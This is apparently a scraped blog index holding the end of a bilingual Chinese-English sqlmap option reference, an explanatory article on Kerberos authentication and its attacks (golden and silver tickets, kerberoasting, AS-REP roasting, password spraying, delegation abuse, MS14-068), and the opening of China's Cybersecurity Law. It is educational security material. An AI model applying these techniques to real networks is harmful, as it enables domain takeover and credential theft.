枚举的DBMS数据库中的表 --columns Enumerate DBMS database table columns 枚举DBMS数据库表列 --schema Enumerate DBMS schema 枚举数据库架构 --count Retrieve number of entries for table(s) 检索表的条目数 --dump Dump DBMS database table entries 转储数据库管理系统的数据库中的表项 --dump-all Dump all DBMS databases tables entries 转储数据库管理系统的数据库中的表项 --search Search column(s), table(s) and/or database name(s) 搜索列（S），表（S）和/或数据库名称（S） --comments Retrieve DBMS comments 检索数据库的comments(注释、评论) -D DB DBMS database to enumerate 要进行枚举的数据库名 -T TBL DBMS database table(s) to enumerate 要进行枚举的数据库表 -C COL DBMS database table column(s) to enumerate 要进行枚举的数据库列 -X EXCLUDECOL DBMS database table column(s) to not enumerate 要不进行枚举的数据库列 -U USER DBMS user to enumerate 用来进行枚举的数据库用户 --exclude-sysdbs Exclude DBMS system databases when enumerating tables 枚举表时排除系统数据库 --pivot-column=P.. Pivot column name 主列名称 --where=DUMPWHERE Use WHERE condition while table dumping 使用WHERE条件进行表转储 --start=LIMITSTART First query output entry to retrieve 第一个查询输出进入检索 --stop=LIMITSTOP Last query output entry to retrieve 最后查询的输出进入检索 --first=FIRSTCHAR First query output word character to retrieve 第一个查询输出字的字符检索 --last=LASTCHAR Last query output word character to retrieve 最后查询的输出字字符检索 --sql-query=QUERY SQL statement to be executed 要执行的SQL语句 --sql-shell Prompt for an interactive SQL shell 提示交互式SQL的shell --sql-file=SQLFILE Execute SQL statements from given file(s) 从给定文件执行SQL语句 Brute force（蛮力）: These options can be used to run brute force checks 这些选项可以被用来运行蛮力检查。 --common-tables Check existence of common tables 检查存在共同表 --common-columns Check existence of common columns 检查存在共同列 User-defined function injection（用户自定义函数注入）:​ These options can be used to create custom user-defined functions 这些选项可以用来创建用户自定义函数。 --udf-inject Inject custom user-defined functions 注入用户自定义函数 --shared-lib=SHLIB Local path of the shared library 共享库的本地路径 File system access（访问文件系统）: These options can be used to access the back-end database management system underlying file system 这些选项可以被用来访问后端数据库管理系统的底层文件系统。 --file-read=RFILE Read a file from the back-end DBMS file system 从后端的数据库管理系统文件系统读取文件 --file-write=WFILE Write a local file on the back-end DBMS file system 编辑后端的数据库管理系统文件系统上的本地文件 --file-dest=DFILE Back-end DBMS absolute filepath to write to 后端的数据库管理系统写入文件的绝对路径 Operating system access（操作系统访问）: These options can be used to access the back-end database management system underlying operating system 这些选项可以用于访问后端数据库管理系统的底层操作系统。 --os-cmd=OSCMD Execute an operating system command 执行操作系统命令 --os-shell Prompt for an interactive operating system shell 交互式的操作系统的shell --os-pwn Prompt for an OOB shell, Meterpreter or VNC 获取一个OOB shell，meterpreter或VNC --os-smbrelay One click prompt for an OOB shell, Meterpreter or VNC 一键获取一个OOB shell，meterpreter或VNC --os-bof Stored procedure buffer overflow exploitation 存储过程缓冲区溢出利用 --priv-esc Database process user privilege escalation 数据库进程用户权限提升 --msf-path=MSFPATH Local path where Metasploit Framework is installed Metasploit Framework本地的安装路径 --tmp-path=TMPPATH Remote absolute path of temporary files directory 远程临时文件目录的绝对路径 Windows registry access（Windows注册表访问）: These options can be used to access the back-end database management system Windows registry 这些选项可以被用来访问后端数据库管理系统Windows注册表。 --reg-read Read a Windows registry key value 读一个Windows注册表项值 --reg-add Write a Windows registry key value data 写一个Windows注册表项值数据 --reg-del Delete a Windows registry key value 删除Windows注册表键值 --reg-key=REGKEY Windows registry key Windows注册表键 --reg-value=REGVAL Windows registry key value Windows注册表项值 --reg-data=REGDATA Windows registry key value data Windows注册表键值数据 --reg-type=REGTYPE Windows registry key value type Windows注册表项值类型 General（一般）: These options can be used to set some general working parameters 这些选项可以用来设置一些一般的工作参数。 -s SESSIONFILE Load session from a stored (.sqlite) file 保存和恢复检索会话文件的所有数据 -t TRAFFICFILE Log all HTTP traffic into a textual file 记录所有HTTP流量到一个文本文件中 --batch Never ask for user input, use the default behaviour 从不询问用户输入，使用所有默认配置。 --binary-fields=.. Result fields having binary values (e.g. &quot;digest&quot;) 具有二进制值的结果字段 --charset=CHARSET Force character encoding used for data retrieval 强制用于数据检索的字符编码 --crawl=CRAWLDEPTH Crawl the website starting from the target URL 从目标网址开始抓取网站 --crawl-exclude=.. Regexp to exclude pages from crawling (e.g. &quot;logout&quot;) 正则表达式排除网页抓取 --csv-del=CSVDEL Delimiting character used in CSV output (default &quot;,&quot;) 分隔CSV输出中使用的字符 --dump-format=DU.. Format of dumped data (CSV (default), HTML or SQLITE) 转储数据的格式 --eta Display for each output the estimated time of arrival 显示每个输出的预计到达时间 --flush-session Flush session files for current target 刷新当前目标的会话文件 --forms Parse and test forms on target URL 在目标网址上解析和测试表单 --fresh-queries Ignore query results stored in session file 忽略在会话文件中存储的查询结果 --hex Use DBMS hex function(s) for data retrieval 使用DBMS hex函数进行数据检索 --output-dir=OUT.. Custom output directory path 自定义输出目录路径 --parse-errors Parse and display DBMS error messages from responses 解析和显示响应中的DBMS错误消息 --save=SAVECONFIG Save options to a configuration INI file 保存选项到INI配置文件 --scope=SCOPE Regexp to filter targets from provided proxy log 使用正则表达式从提供的代理日志中过滤目标 --test-filter=TE.. Select tests by payloads and/or titles (e.g. ROW) 根据有效负载和/或标题(e.g. ROW)选择测试 --test-skip=TEST.. Skip tests by payloads and/or titles (e.g. BENCHMARK) 根据有效负载和/或标题跳过测试（e.g. BENCHMARK） --update Update sqlmap 更新SqlMap Miscellaneous（杂项）: -z MNEMONICS Use short mnemonics (e.g. &quot;flu,bat,ban,tec=EU&quot;) 使用简短的助记符 --alert=ALERT Run host OS command(s) when SQL injection is found 在找到SQL注入时运行主机操作系统命令 --answers=ANSWERS Set question answers (e.g. &quot;quit=N,follow=N&quot;) 设置问题答案 --beep Beep on question and/or when SQL injection is found 发现SQL注入时提醒 --cleanup Clean up the DBMS from sqlmap specific UDF and tables SqlMap具体的UDF和表清理DBMS --dependencies Check for missing (non-core) sqlmap dependencies 检查是否缺少（非内核）sqlmap依赖关系 --disable-coloring Disable console output coloring 禁用控制台输出颜色 --gpage=GOOGLEPAGE Use Google dork results from specified page number 使用Google dork结果指定页码 --identify-waf Make a thorough testing for a WAF/IPS/IDS protection 对WAF / IPS / IDS保护进行全面测试 --skip-waf Skip heuristic detection of WAF/IPS/IDS protection 跳过启发式检测WAF / IPS / IDS保护 --mobile Imitate smartphone through HTTP User-Agent header 通过HTTP User-Agent标头模仿智能手机 --offline Work in offline mode (only use session data) 在离线模式下工作（仅使用会话数据） --page-rank Display page rank (PR) for Google dork results Google dork结果显示网页排名（PR） --purge-output Safely remove all content from output directory 安全地从输出目录中删除所有内容 --smart Conduct thorough tests only if positive heuristic(s) 只有在正启发式时才进行彻底测试 --sqlmap-shell Prompt for an interactive sqlmap shell 提示交互式sqlmap shell --wizard Simple wizard interface for beginner users 给初级用户的简单向导界面","link":"/2018/08/08/sqlmap%E5%B8%AE%E5%8A%A9%E6%96%87%E6%A1%A3/"},{"title":"域渗透|Kerberos域认证机制剖析","text":"Kerberos域认证机制剖析 Kerberos概念Kerberos是一种网络认证协议，其设计目标是通过密钥系统为Client / Server应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。 在以上情况下， Kerberos作为一种可信任的第三方认证服务，是通过传统的密码技术(如:共享 密钥)执行认证服务的。 域认证所参与的角色 Kerberos的标志是三只狗头，狗头分别代表以下三个角色 访问服务的Client 提供服务的Server KDC（Key Distribution Center）密钥分发中心 kerberos 测试工具介绍 其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务。在Kerberos中Client是否有权限访问Server端的服务由KDC(Key Distribution Center)发放的票据来决定。 Kerberos认证协议TGT（Ticket Granting Ticket） 由身份认证服务AS(Authentication Service)授予的票据，TGT用于身份认证，存储在内存，默认有效期为10小时，通过TGT能够获得票据（Ticket），TGT是一种 临时凭证 的存在，伪造的TGT又被称为 黄金票据。 票据（Server Ticket/Ticket） 是网络对象互相访问的 凭证，伪造的ST\\Ticket又被称为 白银票据。 KDC(Key Distribution Center) 负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由以下服务组成： AS(Authentication Service): 身份认证服务，为Client生成TGT(Ticket Granting Ticket)的服务。 TGS(Ticket Granting Service): 票据授予服务，为Client生成某个服务的Ticket的服务。 AD(Account Database) 一个类似于本机SAM的一个数据库，存储所有Client的白名单，只有存在于白名单的Client才能顺利申请到TGT。 ※补充：从物理层面看，AD与KDC均为域控制器(Domain Controller)。 域认证粗略流程过程简述①-②：Client向kerberos服务请求，希望获取访问Server的权限。 kerberos得到了这个消息，首先得判断Client是否是可信赖的， 也就是白名单黑名单的说法。 这就是AS(Authentication Service)服务完成的工作，通过在AD(Account Database)中存储黑名单和白名单来区分Client。 成功后，AS(Authentication Service)返回TGT（Ticket Granting Ticket）给Client。 ③-④：Client得到了TGT（Ticket Granting Ticket）后，继续向kerberos请求，希望获取访问 Server的权限。kerberos又得到了这个消息，这时候通过Client 消息中的TGT，判断出了Client拥有了这个权限，给了Client访问Server的权限Ticket。 ⑤-⑥：Client得到Ticket后，终于可以成功访问Server。这个Ticket只是 针对这个Server，其他Server需要向TGS(Ticket Granting Service)申请。 较详简述 AS_REQ: Client向KDC发起AS_REQ，请求凭据是Client hash加密的时间戳 AS_REP: KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据，TGT里面包含PAC，PAC包含用户Client的sid和用户Client所在的组。 TGS_REQ: Client凭借TGT票据向KDC发起针对特定Server的TGS_REQ请求 TGS_REP: KDC使用krbtgt hash进行解密，如果结果正确，就返回用Server hash加密的TGS票据 [Ticket]（这一步不管用户有没有访问Server的权限，只要TGT正确，就返回TGS票据 [Ticket]） AP_REQ: Client拿着TGS票据(Ticket)去请求Server AP_REP: Server使用自己的hash解密TGS票据(Ticket)。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问Server的权限。 域认证详细流程AS_REQ &amp; AS_REPAS_REQ123456781. pvnokerberos 版本号2. msg-type类型，AS_REQ对应的就是KRB_AS_REQ(0x0a)3. PA_DATA主要是一些认证信息。一个列表，包含若干个认证消息用于认证，我们也可以Authenticator。每个认证消息有type和value。4. REQ_BODYkdc-options 一些flag 字段 AS_REP123456789101. msg-typeAS_REQ的响应body对应的就是KRB_AS_REP(0x0b)2. crealm域名3. cname用户名4. ticket这个ticket用于TGS_REQ的认证。是加密的，用户不可读取里面的内容。在AS_REQ请求里面是，是使用krbtgt的hash进行加密的，因此如果我们拥有krbtgt的hash就可以自己制作一个ticket，既黄金票据。详情见相关的安全问题&gt;黄金票据.5. enc_part这部分是可以解密的，key是用户hash，解密后得到Encryptionkey，Encryptionkey里面最重要的字段是session key，作为下阶段的认证密钥。 TGS_REQ &amp; TGS_REPTGS_REQ12345678910111. msg-type类型，TGS_REQ对应的就是KRB_TGS_REQ(0x0c)2. PA-DATA正常的TGS_REQ的请求需要用到有AP_REQ：这个是TGS_REQ必须携带的部分，这部分会携带AS_REP里面获取到的TGT票据，就放在这个结构体里面。KDC校验TGT票据，如果票据正确，就返回TGS票据。PA_FOR_USER：类型是S4U2SELF,值是一个唯一的标识符，该标识符指示用户的身份。该唯一标识符由用户名和域名组成。S4U2proxy 必须扩展PA_FOR_USER结构，指定服务代表某个用户(图片里面是administrator)去请求针对服务自身的kerberos服务票据。PA_PAC_OPTIONS：值是以下flag的组合Claims(0)、Branch Aware(1)、Forward to Full DC(2)、Resource-based Constrained Delegation (3)。微软的MS-SFU 2.2.5，S4U2proxy 必须扩展PA-PAC-OPTIONS结构。如果是基于资源的约束委派，就需要指定Resource-based Constrained Delegation位。3. REQ_BODYsname：这个是要请求的服务，TGS_REP获得的ticket是用该服务用户的hash进行加密的。有个比较有意思的特性是，如果指定的服务是krbtgt，那么拿到的TGS票据是可以当做TGT票据用的。AddtionTicket：附加票据，在S4U2proxy请求里面，既需要正常的TGT，也需要S4U2self阶段获取到的TGS，那么这个TGS就添加到AddtionTicket里面。 TGS_REP1234561. msg-typeAS_REQ的响应body对应的就是KRB_TGS_REQ(0x0d)2. ticket这个ticket用于AP_REQ的认证。其中里面的enc_part是加密的，用户不可读取里面的内容。在AS_REQ请求里面是，是使用krbtgt的hash进行加密的，而在TGS_REQ里面是使用要请求的服务的hash加密的。因此如果我们拥有服务的hash就可以自己制作一个ticket，既白银票据。详情见相关的安全问题&gt;白银票据.正因为是使用要请求的服务的hash加密的，所以我们可以通过爆破enc_part获得该服务的hash,详情见相关的安全问题&gt;kerberoasting。3. enc_part注意，这个enc_part不是ticket里面的enc_part，部分是可以解密的，key是上一轮AS_REP里面返回的session_key,也就是导入凭据里面的 session_key，解密后得到encryptionkey，encryptionkey这个结构里面最重要的字段也是session_key(但是这个session_key 不同于上一轮里面的session_key)，用来作为作为下阶段的认证密钥。 S4U2SELF s4u2self的过程如下图所示(前提条件是服务已经有通过KDC验证的TGT) S4U2self 使得服务可以代表用户获得针对服务自身的kerberos服务票据。这使得服务可以获得用户的授权( 可转发 的用户TGS票据)，然后将其用于后期的认证(主要是后期的s4u2proxy)，这是为了在用户以不使用 Kerberos 的方式对服务进行身份验证的情况下使用。这里面很重要的一点是服务代表用户获得针对服务自身的kerberos票据这个过程，服务是不需要用户的凭据的 S4U2PROXY s4u2proxy的过程如下图所示 s4u2proxy 使得服务1可以使用来自用户的授权( 在S4U2SELF阶段获得)，然后用该TGS(放在AddtionTicket里面)向KDC请求访问服务2的TGS，并且代表用户访问服务2，而且只能访问服务2。 委派 在Windows 2000 Server首次发布Active Directory时，Microsoft必须提供一种简单的机制来支持用户通过Kerberos向Web Server进行身份验证并需要代表该用户更新后端数据库服务器上的记录的方案。这通常称为“ Kerberos双跳问题”，并且要求进行委派，以便Web Server在修改数据库记录时模拟用户。 需要注意的一点是接受委派的用户只能是服务账户或者计算机用户。 非约束委派例子： 服务(如JACKSON-PC$) 被配置了非约束的委派，那么JACKSON-PC$可以接受任何用户的委派的去请求其他所有服务。在协议层面的实现就是，某个用户委托JACKSON-PC$去访问某个服务，那么这个用户会将 TGT（在TGS里面）发送到JACKSON-PC$并缓存到LSASS中，以方便以后使用。 然后JACKSON-PC$模拟用户去请求某个服务。 配置了非约束委派的用户的userAccountControl 属性有个FLAG位 TrustedForDelegation 关于userAccountControl 每一位对应的意义可以看Converting AD UserAccountControl Attribute Values,(我们在LDAP篇也会详细介绍)，其中 TRUSTED_FOR_DELEGATION 对应是 0x80000 ，也就是 524288 。 约束委派微软很早就意识到非约束委派并不是特别安全，在 Windows 2003上发布了”约束”委派。 其中包括一组 Kerberos 协议扩展，就是本文之前提到的两个扩展 S4U2Self 和 S4U2Proxy。配置它后，约束委派将限制指定服务器可以代表用户执行的服务。这需要SeEnableDelegation特权（该特权很敏感，通常仅授予域管理员）才能为服务配置域帐户，并且将帐户限制为单个域。 例子： 计算机用户(即JACKSON-PC$) 被配置了约束的委派，那么JACKSON-PC$可以接受任何用户的委派的去请求特定的服务。具体过程是收到用户的请求之后，首先代表用户获得针对服务自身的可转发的kerberos服务票据(S4U2SELF)，拿着这个票据向KDC请求访问特定服务的可转发的TGS(S4U2PROXY)，并且代表用户访问特定服务，而且只能访问该特定服务。 相较于非约束委派，约束委派最大的区别也就是配置的时候选择某个特定的服务，而不是所有服务。 配置了约束委派的用户的userAccountControl 属性有个FLAG位 TrustedToAuthForDelegation 。 关于userAccountControl 每一位对应的意义可以看Converting AD UserAccountControl Attribute Values,其中 TRUSTED_TO_AUTH_FOR_DELEGATION 对应是 0x1000000 ，也就是 16777216 。 基于资源的约束委派为了配置受约束的委派，必须拥有SeEnableDelegation特权（该特权很敏感，通常仅授予域管理员）。为了使用户/资源更加独立，Windows Server 2012中引入了基于资源的约束委派。基于资源的约束委派允许资源配置受信任的帐户委派给他们。基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员。 基于资源的约束委派只能在运行Windows Server 2012 R2和Windows Server 2012的域控制器上配置，但可以在混合模式林中应用。 这种约束委派的风格与传统约束委派非常相似，但配置相反。 传统约束委派在msDS-AllowedToDelegateTo属性中的帐户A上配置，并定义从A到B的“传出”信任。 基于资源的约束委派在S-AllowedToActOnBehalfOfOtherIdentity属性中的帐户B上配置，并定义从A到B的“传入”信任。 PAC 微软为了访问控制而引进的一个扩展PAC，PAC在历史上出现过的一个严重的，允许普通用户提升到域管的漏洞MS14068。 引进PAC之后的kerberos流程 用户向KDC发起AS_REQ，请求凭据是用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据，TGT里面包含PAC，PAC中包含用户的sid、用户所在的组。 用户凭借TGT向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash加密的ST\\Ticket(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回ST\\Ticket，这也是kerberoating能利用的原因：任何一个用户，只要hash正确，就可以请求域内任何一个服务的ST\\Ticket，具体内容可以参考Windows内网协议学习Kerberos篇之TGSREQ&amp; TGSREP) 用户拿着ST\\Ticket去请求服务，服务使用自己的hash解密ST\\Ticket。如果解密正确，就拿着PAC去KDC那边询问用户有没有访问权限，域控解密PAC。获取用户的sid、用户所在的组，再判断用户是否有访问服务的权限，有访问权限就允许用户访问（有用户hash，可以制作ST\\Ticket，但是不能制作PAC，PAC自然也验证不成功，但是有些服务不去验证PAC，这是白银票据成功的前提）。 特别说明的是，PAC对于用户和服务全程都是不可见的。只有KDC能制作和查看PAC。 相关的安全问题AS_REQ &amp; AS_REPPTH\\ PTK 连接配置的时候允许使用hash进行认证，不是只有账号密码才能认证。 由于在进行认证的时候，是使用用户hash加密时间戳，所以在使用密码进行登录的情况下，也是先把密码加密成hash后再进行认证。 因此在只有用户hash，没有明文密码的情况下也是可以进行认证的。 不管是rubeus还是impacket里面的相关脚本都是支持直接使用hash进行认证。 12如果 hash 是 ntlm hash ，然后加密方式是 rc4 ，这种就算做是 pass the hash如果 hash 是 aes key(使用sekurlsa::ekeys导出来) ，就算是 pass the key 在很多地方，不支持rc4加密方式的时候，使用pass the key不失为一种好方法。 用户名枚举 域内没有域账号的情况下进行用户名枚举有域账号的情况的下可以直接通过LDAP查询（域机器提到System权限后，其机器账号也是域账号） 进行AS_REQ时，用户名存在但密码错误与用户名不存在的相应包有不同，通过这个比较就可以写脚本改变cname的值进行用户名枚举（https://daiker.gitbook.io/windows-protocol/kerberos/1#2.-yong-hu-ming-mei-ju）。 Password Spraying(密码喷洒) 在已有用户名的时候，可以尝试爆破密码。 进行AS_REQ时，用户名存在且密码正确与用户名存在但密码错误的相应包有不同。 实战中，都会使用“密码喷洒（Password Spraying）”的技术来进行测试和攻击。因为针对同一个用户的连续密码猜测会导致帐户被锁定，所以只有对所有用户同时指定唯一的密码去登录尝试，消除帐户被锁定的概率从而增加破解成功率。 AS-REPRoasting（用户明文口令爆破） 对于域用户，设置了选项Do not require Kerberos preauthentication(不要求Kerberos预身份验证) 此时向域控制器的88端口发送AS_REQ请求，对收到的AS_REP内容重新组合（enc-part底下的ciper，因为这部分是使用用户hash加密session-key，我们通过进行离线爆破就可以获得用户hash），能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，可以使用hashcat对其破解，最终获得该用户的明文口令。 黄金票据 AS确认Client端登录者用户身份，通过伪造的TGT，可以获取任意Kerberos的访问权限，由krbtgt NTLM Hash加密。 伪造条件12341、域名称2、域的SID值3、域的KRBTGT账号的HASH（意味着你已经有域控制器权限了)4、伪造任意用户名,可以是任意的 在Kerberos认证中，Client通过AS(Authentication Service)认证后，AS会给Client一个Logon Session Key和TGT，而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的(此账户一般不会改密码)，所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。 有了金票后，就可以跳过AS验证，直接同KDC交互，不用验证账户和密码，所以也不用担心域管密码被修改。 TGS_REQ &amp; TGS_REPPTT(pass the ticket) Kerbreos 除了第一步AS_ERQ是使用 时间戳 加密用户hash验证之外，其他的步骤的验证都是通过票据，这个票据可以是TGT(Ticket Granting Ticket)或者TGS票据(Server Ticket/Ticket)。因为票据里面的内容主要是session_key和ticket(使用服务hash加密的，服务包括krbtgt)，拿到票据之后，我们就可以用这个票据来作为下阶段的验证了。 kerberosting（服务hash爆破） 因为TGS_REP里面ticket里的enc_part(是ticket里面的enc_part,不是最外层的enc_part,最外层的enc_part是使用AS_REP里面的session_key加密的，这个session_key我们已经有了，没有意义)，是使用要请求的服务的hash加密的，所以我们可以通过爆破获得服务的hash。 这个问题存在的另外一个因素是因为用户向KDC发起TGS_REQ请求，不管用户对服务有没有访问权限，只要TGT正确，那么肯定会返回TGS。 其实AS_REQ里面的服务就是krbtgt，也就是说这个同样用于爆破AS_REP里面的ticket部分的encpart得到krbtgt的hash，但网上没出现这种攻击方式是因为krbtgt的密码是随机生成的，我们也跑不出来. 白银票据 Client向Server发送服务请求，通过伪造的Ticket，只能访问指定的服务，如cifs、http、mssql等，由服务账号NTLM Hash加密。 伪造条件1234561、域名称2、域SID3、目标服务器的FQDN（Fully Qualified Domain Name全限定域名，即同时带有主机名和域名的名称。）4、可利用的服务（运行在目标服务器上的kerberos服务，该服务主体名称类型如cifs，http，mssql等）5、服务账号的NTLM Hash（如果是域控制器，那就代表DC已经被拿下了）6、需要伪造的用户名,可以是任意的 在Kerberos认证中的第⑤-⑥步，Client带着Ticket和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后，通过自己的Master Key解密Ticket，从而获得Session Key。通过Session Key解密Authenticator3，进而验证对方的身份，验证成功就允许Client访问Server上的指定服务了。 所以我们只需要知道Server用户的Hash就可以伪造出一个Ticket，且不会经过KDC，但是伪造的Ticket只对部分服务起作用（已经在TGT的PAC里，通过SID的值限定了给Client授权的服务）。 非约束委派攻击 如果我们找到配置了 非约束的委派的账户，比如JACKSON-PC$，并且通过一定手段拿下该账户的权限，然后诱导域管访问该JACKSON-PC$，这个时候域管会将自己TGT发送到JACKSON-PC$并缓存到LSASS中，那我们就可以从LSASS中导出域管的TGT票据，然后通过PTT，从而拥有域管的权限。 约束委派攻击 如果我们找到配置了 约束委派的服务账号，比如JACKSON-PC$，并且通过一定手段拿下该账号所在的机子。我们就可以利用这个服务账号代表任意用户 (重点：服务代表用户获得针对服务自身的kerberos票据这个过程，服务不需要用户凭据) 进行s4u2self获得一个可转发的票据，然后把获取到的票据用于s4u2proxy(作为AddtionTicket)，从而获取一个可转发的TGS，服务就可以代替任意用户访问另外一个服务(既被配置的约束委派的服务：cifs/WIN-JQO4OSMOGK2.JMU.com）。 相较于非约束的委派，约束的委派并不需要用户过来访问就可以代表该用户，但是只能访问特定的服务，不像非约束的委派哪个可以访问任意服务。 123456对于 HOST SPN，可以实现完全的远程接管。对于 MSSQLSvc SPN，可以拿到 DBA 权限。 对于 CIFS SPN 可以实现完全的远程文件访问。对于 HTTP SPN 则可能实现接管远程网络服务。对于 LDAP 则可以执行 DCSync。对于 HTTP 或 SQL 服务帐户，即使它们没有提升目标服务器上的管理员权限，也可能使用 Rotten Potato 进一步滥用，提权至 SYSTEM 的权限 基于资源的约束委派攻击 基于资源的约束委派具有传统的约束委派的所有安全问题，但是相较于传统的约束委派。基于资源的约束委派的利用又相对较为简单。 主要体现为，普通的约束委派的配置需要SeEnableDelegation权限，而这个权限通常仅授予Domain Admins。因此我们对普通的约束委派的利用，往往在于寻找域内已有的约束委派，再利用。 但是对于基于资源的约束委派，假如我们已经拥有服务账号1，那么只要具备用户2的LDAP权限，这样就可以配置服务1对服务2的约束委派(在服务账户2的用户属性上配置S-AllowedToActOnBehalfOfOtherIdentity为1的sid)，服务1就可以控制服务2。 PACMS14068 补丁编号是KB3011780，域里面最严重的漏洞之一，它允许任意用户提升到域管权限。 该漏洞最本质的地方在于Microsoft Windows Kerberos KDC无法正确检查Kerberos票证请求随附的特权属性证书（PAC）中的有效签名，这里面的签名就是上面提到的服务检验和和KDC校验和。导致用户可以自己构造一张PAC。 签名原本的设计是要用到HMAC系列的checksum算法，也就是必须要有key的参与，我们没有krbtgt的hash以及服务的hash，就没有办法生成有效的签名，但是问题就出在，实现的时候允许所有的checksum算法都可以，包括MD5。那我们只需要把PAC进行md5，就生成新的校验和。这也就意味着我们可以随意更改PAC的内容，完了之后再用md5给他生成一个服务检验和以及KDC校验和。在MS14-068修补程序之后，Microsoft添加了一个附加的验证步骤，以确保校验和类型为KRB_CHECKSUM_HMAC_MD5。 https://daiker.gitbook.io/windows-protocol/kerberos/3#0x03-xiang-guan-an-quan-wen-ti 参考文章https://daiker.gitbook.io/windows-protocol/kerberos https://payloads.online/archivers/2018-11-30/1/ https://www.cnblogs.com/0x7e/p/13862453.html https://www.jianshu.com/p/4936da524040","link":"/2021/10/20/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/"},{"title":"中华人民共和国网络安全法","text":"中华人民共和国主席令 第五十三号 《中华人民共和国网络安全法》已由中华人民共和国第十二届全国人民代表大会常务委员会第二十四次会议于2016年11月7日通过，现予公布，自2017年6月1日起施行。 中华人民共和国主席 习近平 2016年11月7日 中华人民共和国网络安全法 目 录 第一章 总则 第二章 网络安全支持与促进 第三章 网络运行安全 第一节 一般规定 第二节 关键信息基础设施的运行安全 第四章 网络信息安全 第五章 监测预警与应急处置 第六章 法律责任 第七章 附则 第一章 总则 第一条 为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。 第二条 在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。 第三条 国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。 第四条 国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。 第五条 国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。 第六条 国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。 第七条 国家积极开展网络空间治理、网络技术研发和标准制定、打击网络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。 第八条 国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。 县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。 第九条 网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。 第十条 建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。 第十一条 网络相关行业组织按照章程，加强行业自律，制定网络安全行为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。 第十二条 国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。 任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。 第十三条 国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。 第十四条 任何个人和组织有权对危害网络安全的行为向网信、电信、公安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。 有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。 第二章 网络安全支持与促进 第十五条 国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。 国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家标准、行业标准的制定。 第十六条 国务院和省、自治区、直辖市人民政府应当统筹规划，加大投入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构和高等学校等参与国家网络安全技术创新项目。 第十七条 国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。 第十八条 国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。 国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。 第十九条 各级人民政府及其有关部门应当组织开展经常性的网络安全宣传教育，并指导、督促有关单位做好网络安全宣传教育工作。 大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。 第二十条 国家支持企业和高等学校、职业学校等教育培训机构开展网络安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。 第三章 网络运行安全 第一节 一般规定 第二十一条 